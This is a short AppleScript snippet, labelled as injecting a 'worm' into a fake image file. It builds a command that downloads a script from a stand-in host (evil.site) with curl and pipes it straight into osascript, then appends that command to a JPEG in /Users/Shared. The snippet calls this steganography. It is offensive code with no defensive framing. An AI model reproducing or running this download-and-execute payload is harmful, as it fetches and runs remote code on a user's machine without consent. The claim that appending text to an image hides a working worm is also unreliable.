-- Inject worm into a fake image file

set fakeJPEG to "/Users/Shared/sunset.jpg"
set worm to "osascript -e 'do shell script \"curl http://evil.site/stealth.scpt | osascript -\"'"

-- Append payload to a JPEG file (rudimentary steganography)
do shell script "echo '" & worm & "' >> " & quoted form of fakeJPEG
